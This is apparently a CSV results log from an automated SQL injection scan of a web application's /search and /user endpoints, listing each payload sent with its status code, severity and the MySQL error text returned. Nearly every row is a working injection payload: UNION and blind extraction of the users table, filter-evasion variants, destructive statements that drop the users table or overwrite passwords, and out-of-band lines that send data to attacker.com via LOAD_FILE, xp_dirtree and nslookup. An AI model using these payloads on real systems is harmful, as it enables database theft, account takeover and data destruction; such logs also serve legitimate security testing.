Type,Vulnerability,Endpoint,Method,Parameter,Status Code,Severity,Payload,Evidence
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' AND CAST((SELECT version()) AS int)--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' AND 1=CAST((SELECT user) AS int)--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND CONVERT(int, (SELECT @@version))--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND 1=CONVERT(int, (SELECT user_name()))--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1'; INSERT INTO users(username,password) VALUES('test','test')--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'; UPDATE users SET password='hacked' WHERE id=1--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'; DROP TABLE users--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1'; INSERT INTO users(username,password) VALUES('test','test')--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'; UPDATE users SET password='hacked' WHERE id=1--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'; DROP TABLE users--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,admin'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Boolean-based Blind SQLi,/search,GET,q,200,Medium,admin' OR '1'='1,응답 내용 변화 감지
SQL Injection,Error-based SQLi,/search,GET,q,400,High,test' UNION SELECT * FROM users--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test.txt')))--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'; EXEC xp_dirtree '\\attacker.com\test'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND ASCII(SUBSTR((SELECT user()),1,1))>64--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND ASCII(SUBSTR((SELECT database()),1,1))>64--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND ASCII(SUBSTR((SELECT version()),1,1))>64--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>64--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables LIMIT 0,1)='u'--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>64--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))>64--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 0,1)='a'--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND IF(ASCII(SUBSTR((SELECT user()),1,1))>64,SLEEP(5),0)--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND IF(ASCII(SUBSTR((SELECT database()),1,1))>64,SLEEP(5),0)--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND (CASE WHEN ASCII(SUBSTR((SELECT user),1,1))>64 THEN pg_sleep(5) ELSE pg_sleep(0) END)--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1'; IF ASCII(SUBSTRING((SELECT user_name()),1,1))>64 WAITFOR DELAY '00:00:05'--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'/**/OR/**/1=1--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'/**/OR/**/'1'='1'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'%09OR%091=1--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'%0AOR%0A1=1--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' OR 1=1#," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' OR 1=1--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' OR 1=1/*," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Boolean-based Blind SQLi,/search,GET,q,200,Medium,%27 OR %271%27=%271%27--,응답 내용 변화 감지
SQL Injection,Boolean-based Blind SQLi,/search,GET,q,200,Medium,%27 OR %271%27=%271%27%23,응답 내용 변화 감지
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' Or '1'='1'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' oR '1'='1'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' OR '1'='1'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' OR '1'='1'||'1'='1'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' OR CONCAT('1','=','1')--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Boolean-based Blind SQLi,/search,GET,q,200,Medium,"{""$ne"": null}",응답 내용 변화 감지
SQL Injection,Boolean-based Blind SQLi,/search,GET,q,200,Medium,"{""$gt"": """"}",응답 내용 변화 감지
SQL Injection,Error-based SQLi,/search,GET,q,400,High,' OR '1'='1'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,' OR 1=1--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,' OR '1'='1'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,' OR 1=1--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,' OR '1'='1'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,' OR 1=1--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Boolean-based Blind SQLi,/user,GET,id,404,Medium,1 AND 1=2,응답 내용 변화 감지
SQL Injection,Boolean-based Blind SQLi,/user,GET,id,400,Medium,"1 UNION SELECT 1,2,3,4,5--",응답 내용 변화 감지
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1' OR '1'='1'--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1' OR 1=1--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1' AND 1=2--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1' OR SLEEP(5)--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'; SELECT SLEEP(5)--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1' OR pg_sleep(5)--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'; SELECT pg_sleep(5)--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'; WAITFOR DELAY '00:00:05'--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'; WAITFOR DELAY '0:0:5'--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1' UNION SELECT NULL--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' UNION SELECT NULL,NULL--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' UNION SELECT NULL,NULL,NULL--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' UNION SELECT 1,2,3--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' UNION SELECT user(),database(),version()--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1' AND CAST((SELECT version()) AS int)--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1' AND 1=CAST((SELECT user) AS int)--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND CONVERT(int, (SELECT @@version))--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND 1=CONVERT(int, (SELECT user_name()))--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1'; INSERT INTO users(username,password) VALUES('test','test')--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'; UPDATE users SET password='hacked' WHERE id=1--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'; DROP TABLE users--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1'; INSERT INTO users(username,password) VALUES('test','test')--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'; UPDATE users SET password='hacked' WHERE id=1--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'; DROP TABLE users--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,admin'--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,admin' OR '1'='1,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,test' UNION SELECT * FROM users--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test.txt')))--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'; EXEC xp_dirtree '\\attacker.com\test'--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND ASCII(SUBSTR((SELECT user()),1,1))>64--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND ASCII(SUBSTR((SELECT database()),1,1))>64--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND ASCII(SUBSTR((SELECT version()),1,1))>64--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>64--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables LIMIT 0,1)='u'--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>64--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))>64--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 0,1)='a'--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND IF(ASCII(SUBSTR((SELECT user()),1,1))>64,SLEEP(5),0)--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND IF(ASCII(SUBSTR((SELECT database()),1,1))>64,SLEEP(5),0)--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1' AND (CASE WHEN ASCII(SUBSTR((SELECT user),1,1))>64 THEN pg_sleep(5) ELSE pg_sleep(0) END)--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,"1'; IF ASCII(SUBSTRING((SELECT user_name()),1,1))>64 WAITFOR DELAY '00:00:05'--","{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'/**/OR/**/1=1--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'/**/OR/**/'1'='1'--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/user,GET,id,400,High,1'%09OR%091=1--,"{   ""error"": ""(1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
